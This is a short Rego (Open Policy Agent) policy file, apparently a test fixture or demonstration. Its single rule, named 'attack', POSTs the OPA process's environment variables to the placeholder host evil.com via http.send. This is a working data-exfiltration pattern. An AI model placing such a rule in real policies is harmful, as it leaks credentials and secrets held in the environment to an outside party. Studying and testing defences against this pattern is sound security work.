package main
import rego.v1

attack if {
    request := {
        "url": "https://evil.com:9999",
        "method": "POST",
        "body": opa.runtime().env,
    }
    response := http.send(request)
}
